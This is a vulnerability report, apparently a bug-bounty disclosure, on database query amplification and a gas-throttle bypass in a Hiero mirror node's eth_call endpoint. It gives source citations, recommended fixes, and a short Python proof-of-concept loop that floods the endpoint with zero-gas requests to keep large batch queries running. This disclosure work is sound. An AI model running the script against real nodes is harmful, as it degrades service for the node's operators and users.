### Title
Unbounded Batch Slot Query Amplification via eth_call in ContractStateServiceImpl

### Summary
An unprivileged external user can send a sequence of `eth_call` requests targeting different storage slots of the same contract, causing `ContractStateServiceImpl.findStorageBatch()` to issue progressively larger `IN`-clause DB queries — up to 1,500 slots per query. After the `contractState` cache expires (2 seconds), a single follow-up request re-triggers the full 1,500-slot batch query, enabling sustained DB I/O amplification far exceeding 30% above baseline with minimal request volume.

### Finding Description

**Code path:**

`ContractController.call()` → `ThrottleManagerImpl.throttle()` → `ContractExecutionService.processCall()` → `ContractStateServiceImpl.findStorage()` → `ContractStateServiceImpl.findStorageBatch()`

**Root cause — `findStorageBatch()` (lines 85–122):**

```java
contractSlotsCache.putIfAbsent(wrappedKey, EMPTY_VALUE);          // line 90: adds new slot key unconditionally
final var cachedSlotKeys = contractSlotsCache.getNativeCache().asMap().keySet(); // line 91: ALL cached keys

final var cachedSlots = new ArrayList<byte[]>(cachedSlotKeys.size());
for (var slot : cachedSlotKeys) {
    cachedSlots.add(((ByteBuffer) slot).array());
    ...
}
final var contractSlotValues = contractStateRepository.findStorageBatch(contractId.getId(), cachedSlots); // line 103
```

Every call to `findStorageBatch()` issues a DB query with **all** slot keys currently in the per-contract Caffeine cache — not just the requested slot. The slot key is added to the cache at line 90 **before** the query, so each new unique slot request grows the IN-clause by one.

**Repository query (unbounded IN clause):**
```sql
SELECT slot, value FROM contract_state
WHERE contract_id = :contractId AND slot IN (:slots)
```
No LIMIT, no pagination, no cap on the size of `:slots`.

**Cache configuration (default):**
- `slotsPerContract`: `expireAfterAccess=5m, maximumSize=1500` — up to 1,500 slot keys per contract, retained for 5 minutes
- `contractState`: `expireAfterWrite=2s, maximumSize=25000` — cached values expire after 2 seconds
- `contractSlots`: `expireAfterAccess=5m, maximumSize=3000` — up to 3,000 contracts tracked

**Gas throttle bypass:**

```java
public long scaleGas(long gas) {
    if (gas <= GAS_SCALE_FACTOR) {  // GAS_SCALE_FACTOR = 10_000
        return 0L;
    }
    return Math.floorDiv(gas, GAS_SCALE_FACTOR);
}
```

`gasLimitBucket.tryConsume(0)` always returns `true`. Any request with `gas ≤ 10,000` consumes zero tokens from the gas bucket, completely bypassing the gas-based throttle. The only remaining constraint is the global rate limit of 500 RPS (not per-IP).

**Exploit flow:**

1. **Warm-up phase**: Attacker sends 1,500 `eth_call` requests to the same contract address, each accessing a distinct slot key (real or fabricated — the key is added to the cache at line 90 before the DB query). Each request triggers a batch query of growing size: request N issues a query with N slots. Total DB rows fetched: 1+2+…+1500 = **1,125,750 rows** (vs. 1,500 for single-slot queries — a 750× amplification).

2. **Sustain phase**: After 2 seconds, the `contractState` cache expires. The `slotsPerContract` cache still holds all 1,500 slot keys (5-minute TTL). A single `eth_call` to the contract now triggers a 1,500-slot batch query. The attacker repeats this once every 2 seconds — **1 request per 2 seconds sustains a 1,500-slot DB query indefinitely**.

3. **Scale**: The `contractSlots` cache holds up to 3,000 contracts. The attacker can repeat the warm-up for multiple contracts, multiplying the impact.

**Why existing checks fail:**

- **Gas throttle**: Bypassed entirely with `gas=0` or `gas≤10000` (scaleGas returns 0).
- **Rate limit (500 RPS)**: Global, not per-IP. The sustain phase requires only 1 request per 2 seconds per contract — negligible against the 500 RPS budget.
- **Cache size cap (1,500)**: Limits the maximum IN-clause size but does not prevent the amplification — 1,500 slots in a single unbounded IN clause is still a large DB operation.
- **No authentication**: The `/api/v1/contracts/call` endpoint requires no credentials.

### Impact Explanation

Each sustained 1,500-slot batch query forces the DB to parse a large IN clause, perform up to 1,500 index lookups, and return up to 1,500 rows (each 64 bytes: 32-byte slot + 32-byte value = ~96 KB per query). At 1 query per 2 seconds per contract, and with up to 3,000 contracts warmable, the attacker can generate sustained abnormal DB I/O, network traffic between the application and DB, and JVM heap pressure (materializing large `List<ContractSlotValue>` objects). This comfortably exceeds the 30% resource increase threshold compared to normal single-slot query baseline operation.

### Likelihood Explanation

The attack requires no credentials, no special tooling, and no on-chain assets. Any HTTP client can send `eth_call` requests. The warm-up phase (1,500 requests) is well within the 500 RPS global rate limit and completes in under 3 seconds. The sustain phase requires only 1 request per 2 seconds. The gas throttle bypass (gas=0) is trivially exploitable. This is highly repeatable and automatable.

### Recommendation

1. **Cap the batch query size**: In `findStorageBatch()`, limit `cachedSlots` to a configurable maximum (e.g., 100) before issuing the DB query, discarding the oldest/least-recently-used entries.
2. **Fix the gas throttle bypass**: Add a minimum gas floor in `scaleGas()` so that `gas=0` still consumes at least 1 token: `return Math.max(1L, Math.floorDiv(gas, GAS_SCALE_FACTOR))`.
3. **Add per-IP rate limiting**: The current global rate limit does not prevent a single attacker from consuming the full budget.
4. **Add a DB-level LIMIT**: The `findStorageBatch` query should include a `LIMIT` clause to bound result set size regardless of IN-clause length.
5. **Consider lazy loading**: Only query the specific requested slot rather than all cached slot keys; use the batch mechanism only for explicit prefetch scenarios.

### Proof of Concept

```python
import requests, time

TARGET = "http://<mirror-node>/api/v1/contracts/call"
CONTRACT = "0x<target_contract_address>"

# Phase 1: Warm up the per-contract slot cache with 1500 distinct slots
for i in range(1500):
    slot_hex = hex(i)[2:].zfill(64)  # unique slot keys
    requests.post(TARGET, json={
        "to": CONTRACT,
        "gas": 0,  # bypasses gas throttle (scaleGas returns 0)
        "data": "0x" + slot_hex,
        "block": "latest"
    })

# Phase 2: Every 2 seconds, trigger a 1500-slot batch DB query with a single request
while True:
    time.sleep(2)  # wait for contractState cache (expireAfterWrite=2s) to expire
    requests.post(TARGET, json={
        "to": CONTRACT,
        "gas": 0,
        "data": "0x" + "00" * 32,
        "block": "latest"
    })
    # Each iteration forces: SELECT slot, value FROM contract_state
    # WHERE contract_id = X AND slot IN (<1500 slots>)
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6)

### Citations

**File:** web3/src/main/java/org/hiero/mirror/web3/service/ContractStateServiceImpl.java (L85-103)
```java
    private Optional<byte[]> findStorageBatch(final EntityId contractId, final byte[] key) {
        final var contractSlotsCache = ((CaffeineCache) this.contractSlotsCache.get(
                contractId, () -> cacheManagerSlotsPerContract.getCache(contractId.toString())));
        final var wrappedKey = ByteBuffer.wrap(key);
        // Cached slot keys for contract, whose slot values are not present in the contractStateCache
        contractSlotsCache.putIfAbsent(wrappedKey, EMPTY_VALUE);
        final var cachedSlotKeys = contractSlotsCache.getNativeCache().asMap().keySet();

        final var cachedSlots = new ArrayList<byte[]>(cachedSlotKeys.size());
        boolean isKeyEvictedFromCache = true;

        for (var slot : cachedSlotKeys) {
            cachedSlots.add(((ByteBuffer) slot).array());
            if (wrappedKey.equals(slot)) {
                isKeyEvictedFromCache = false;
            }
        }

        final var contractSlotValues = contractStateRepository.findStorageBatch(contractId.getId(), cachedSlots);
```

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/ContractStateRepository.java (L23-28)
```java
    @Query(value = """
                    select slot, value from contract_state
                    where contract_id = :contractId
                    and slot in (:slots)
                    """, nativeQuery = true)
    List<ContractSlotValue> findStorageBatch(@Param("contractId") Long contractId, @Param("slots") List<byte[]> slots);
```

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/properties/CacheProperties.java (L25-39)
```java
    private String contractSlots = "expireAfterAccess=5m,maximumSize=3000,recordStats";

    @NotBlank
    private String contractState = "expireAfterWrite=2s,maximumSize=25000,recordStats";

    private boolean enableBatchContractSlotCaching = true;

    @NotBlank
    private String entity = ENTITY_CACHE_CONFIG;

    @NotBlank
    private String fee = "expireAfterWrite=60m,maximumSize=20,recordStats";

    @NotBlank
    private String slotsPerContract = "expireAfterAccess=5m,maximumSize=1500";
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleProperties.java (L42-47)
```java
    public long scaleGas(long gas) {
        if (gas <= GAS_SCALE_FACTOR) {
            return 0L;
        }
        return Math.floorDiv(gas, GAS_SCALE_FACTOR);
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java (L37-42)
```java
    public void throttle(ContractCallRequest request) {
        if (!rateLimitBucket.tryConsume(1)) {
            throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
        } else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
            throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
        }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/controller/ContractController.java (L37-51)
```java
    @PostMapping(value = "/call")
    ContractCallResponse call(@RequestBody @Valid ContractCallRequest request, HttpServletResponse response) {
        try {
            throttleManager.throttle(request);
            validateContractMaxGasLimit(request);

            final var params = constructServiceParameters(request);
            final var result = contractExecutionService.processCall(params);
            return new ContractCallResponse(result);
        } catch (InvalidParametersException e) {
            // The validation failed, but no processing occurred so restore the consumed tokens.
            throttleManager.restore(request.getGas());
            throw e;
        }
    }
```
